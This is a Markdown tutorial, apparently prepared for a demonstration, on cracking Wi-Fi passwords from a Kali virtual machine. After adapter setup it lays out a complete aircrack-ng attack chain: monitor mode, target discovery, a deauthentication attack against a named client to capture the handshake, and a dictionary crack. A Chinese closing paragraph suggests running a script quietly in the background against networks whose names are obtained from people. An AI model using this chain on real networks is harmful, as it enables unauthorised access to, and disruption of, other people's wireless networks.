# My-Waifu-Is-Not-Safe

# wifi: what's cracking?

## For Connection: network configuration


When pluging the usb device in, this window will pop up. Choose `Connect to Virtual machine` > select your destination device.

![圖片](https://hackmd.io/_uploads/HyYE0AqXyx.png)

`OK`
![圖片](https://hackmd.io/_uploads/ByDQCC5myx.png)

To check the device has already been connected, run `iwconfig` and you must see the device.
![圖片](https://hackmd.io/_uploads/BJgmRA971l.png)

If you see the device by running `lsusb` but don't see it appears at `iwconfig`, again, do the steps above, or check the network settings below. And if you did them several times but still don't see the device, restart the virtual machine.

Here is the connection settings.
`Tabs` >
![圖片](https://hackmd.io/_uploads/rympRA9Xyl.png)

`Edit` > `Virtual Network Editor`
No need to bridge
![圖片](https://hackmd.io/_uploads/r1UOR0qmyl.png)

`VM` > `Settings` > `Network Adapter`
Usually the pluging usb is `VMnet0`
![圖片](https://hackmd.io/_uploads/H1qeJko7Jx.png)


And the setting process is done. Go enjoy your cracking!

## Crack a wifi password: using commands

### Start Monitor Mode

Open monitor mode for the network adaptor is necessary. Here's several commands:

```bash=
ifconfig wlan0 down
```

If you run this, get no networks is normal.
```bash=2
airmon-ng check kill
```


```bash=3
iwconfig wlan0 mode monitor
```
If you see this, ignore it.
![圖片](https://hackmd.io/_uploads/S1VqYys71e.png)

```bash=4
ifconfig wlan0 up
airmon-ng start wlan0
```

To test if monitor mode really on, and ready for injection:
```bash=6
aireplay-ng --test wlan0
```
This is a success response: Injection is working!
![圖片](https://hackmd.io/_uploads/ryDatyj71g.png)

### Turn off monitor mode and recorvery neworks

```bash=
airmon-ng stop wlan0
ifconfig wlan0 down
```
Cause you've killed network manager, you don't have network connection. To recorver it, run:
```bash=3
service NetworkManager restart
```

### Crack a password

#### 1. get the target BSSID

For ex, the target has name `alEx`.
```
airodump-ng --essid alEx wlan0
```
You'll see the `BSSID` at the top left. `Ctrl+C` to interrupt it and copy the address: `62:2D:E9:E6:8A:47`
![圖片](https://hackmd.io/_uploads/rkRyAJjQJl.png)

#### 2. get stations' mac address that connected to the target
```
airodump-ng --bssid 62:2D:E9:E6:8A:47 -c 1 -w /home/kali/Desktop/nets/test1 wlan0
```

And files will store at `/home/kali/Desktop/nets/` with preffix `test1`.

Wait for 5 to 30 seconds, their should be an address (or addresses) below `STATION`.
By the way, the channel `CH` should stay at `1`.
![圖片](https://hackmd.io/_uploads/S1SbGesQke.png)

#### 3. get ACK

Open **ANOTHER** terminal, and the command above should stay running.
```
aireplay-ng -0 20 -a 62:2D:E9:E6:8A:47 -c 50:C2:E8:0B:44:55 wlan0
```

#### 4. EXPLOSION!!

Check the ACK you just get, the file name extension is `.cap`. And usually the latest one has the biggest number.
![圖片](https://hackmd.io/_uploads/SJRS_ximyl.png)

And there we go!
```
aircrack-ng -a2 -b 62:2D:E9:E6:8A:47 -w /home/kali/Desktop/passwords/10-million-password-list-top-1000000.txt /home/kali/Desktop/nets/test1*.cap
```

![圖片](https://hackmd.io/_uploads/SJQYkZs7Jx.png)

## Crack a wifi password: with Python scripts

基本上大部分情況都會被處理，如果還是爆開就...用上面的指令打，因為用上面的指令還比較有展示性一點，但如果用 script 就能悄悄的攻擊，兩種不一樣的方式。

所以如果可以的話，先問他們 wifi 名稱，放到 script 裡面讓他背景執行。如果真的不行的話再手動打，現場展示。